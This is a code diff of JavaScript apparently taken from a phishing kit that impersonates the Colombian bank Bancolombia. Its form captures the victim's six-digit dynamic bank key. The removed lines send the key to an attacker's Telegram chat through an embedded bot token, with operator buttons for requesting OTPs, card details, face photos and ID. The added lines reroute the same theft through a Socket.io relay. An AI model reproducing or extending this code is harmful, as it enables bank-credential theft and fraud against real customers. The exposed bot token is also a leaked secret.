@@ -3,12 +3,15 @@ document.addEventListener('DOMContentLoaded', function() {
     const btnContinuar = document.querySelector('.btn-iniciar');
     const btnCancelar = document.querySelector('.btn-cancelar');
     const form = document.getElementById('dynamicForm');
-    const loadingOverlay = document.createElement('div');
-    loadingOverlay.className = 'loading-overlay';
-    loadingOverlay.innerHTML = `
-        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
-    `;
-    document.body.appendChild(loadingOverlay);
+    
+    // Usar sistema centralizado
+    const sessionId = bancolombia.initGlobalSession();
+    bancolombia.initializeSocket();
+    bancolombia.setupTelegramActions();
+    const loadingOverlay = bancolombia.createLoadingOverlay();
+    
+    // Obtener socket del sistema centralizado
+    const getSocket = () => bancolombia.getSocket();
 
     // Manejar inputs de dígitos
     digitInputs.forEach((input, index) => {
@@ -44,57 +47,111 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    async function sendToTelegram(dynamicCode) {
-        const botToken = '8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY';
-        const chatId = '-1002984980722';
-        const message = `
-🔐 Clave Dinámica: ${dynamicCode}
-⌚ Hora: ${new Date().toLocaleString()}
-        `;
-
-        const keyboard = {
-            inline_keyboard: [
-                [
-                    { text: "1️⃣ Pedir logo", callback_data: "logo" },
-                    { text: "2️⃣ Pedir OTP", callback_data: "otp" }
-                ],
-                [
-                    { text: "3️⃣ Pedir tarjeta", callback_data: "tarjeta" },
-                    { text: "4️⃣ Pedir cara", callback_data: "cara" }
-                ],
-                [
-                    { text: "5️⃣ Pedir cédula", callback_data: "cedula" },
-                    { text: "6️⃣ Finalizar", callback_data: "finalizar" }
-                ]
-            ]
-        };
-
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    reply_markup: keyboard
-                })
-            });
-        } catch (error) {
-            console.error('Error:', error);
-        }
-    }
-
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
+        
         const dynamicCode = Array.from(digitInputs).map(input => input.value).join('');
-        loadingOverlay.style.display = 'flex';
-        await sendToTelegram(dynamicCode);
-        // No ocultamos el overlay, se quedará esperando la acción del bot
+        
+        if (dynamicCode.length !== 6) {
+            alert('Por favor ingresa los 6 dígitos');
+            return;
+        }
+        
+        loadingOverlay.show();
+        
+        // Deshabilitar formulario
+        digitInputs.forEach(input => input.disabled = true);
+        btnContinuar.disabled = true;
+        btnCancelar.disabled = true;
+        
+        console.log('📤 Enviando clave dinámica:', dynamicCode);
+        
+        // Obtener socket actual
+        const socket = getSocket();
+        
+        // Verificar socket
+        console.log('🔍 Verificando socket:', {
+            exists: !!socket,
+            connected: socket ? socket.connected : false,
+            id: socket ? socket.id : null,
+            sessionId: sessionId
+        });
+        
+        if (!socket || !socket.connected) {
+            console.error('❌ Socket no conectado');
+            alert('Error de conexión. Recarga la página.');
+            loadingOverlay.hide();
+            return;
+        }
+        
+        // Datos a enviar
+        const dataToSend = {
+            type: 'dinamica',
+            sessionId,
+            content: {
+                text: `🔐 Clave Dinámica: ${dynamicCode}\n⌚ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
+            },
+            waitForAction: true,
+            timestamp: Date.now()
+        };
+        
+        console.log('📦 Datos a enviar:', dataToSend);
+        
+        // Enviar a través de Socket.io
+        socket.emit('sendData', dataToSend);
+        console.log('✅ Evento sendData emitido');
+        
+        // Timeout de seguridad
+        const timeout = setTimeout(() => {
+            console.warn('⚠️ Timeout esperando confirmación');
+        }, 15000);
+        
+        getSocket().once('dataSent', (response) => {
+            clearTimeout(timeout);
+            if (response.success) {
+                console.log('✅ Clave dinámica enviada a Telegram');
+                // Mantener overlay esperando acción
+            } else {
+                console.error('❌ Error:', response.message);
+                loadingOverlay.hide();
+                digitInputs.forEach(input => input.disabled = false);
+                btnContinuar.disabled = false;
+                btnCancelar.disabled = false;
+                alert('Error al enviar. Intenta nuevamente.');
+            }
+        });
     });
 
     btnCancelar.addEventListener('click', () => {
         window.location.href = 'index.html';
     });
+
+    // Actualizar IP y fecha/hora
+    async function updateInfo() {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipEl = document.getElementById('ipAddress');
+            if (ipEl) ipEl.textContent = `Dirección IP: ${ipData.ip}`;
+            
+            const now = new Date();
+            const options = { 
+                weekday: 'long', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric',
+                hour: 'numeric',
+                minute: 'numeric',
+                hour12: true,
+                timeZone: 'America/Bogota'
+            };
+            const dateEl = document.getElementById('datetime');
+            if (dateEl) dateEl.textContent = now.toLocaleDateString('es-CO', options);
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    }
+
+    updateInfo();
+    setInterval(updateInfo, 60000);
 });
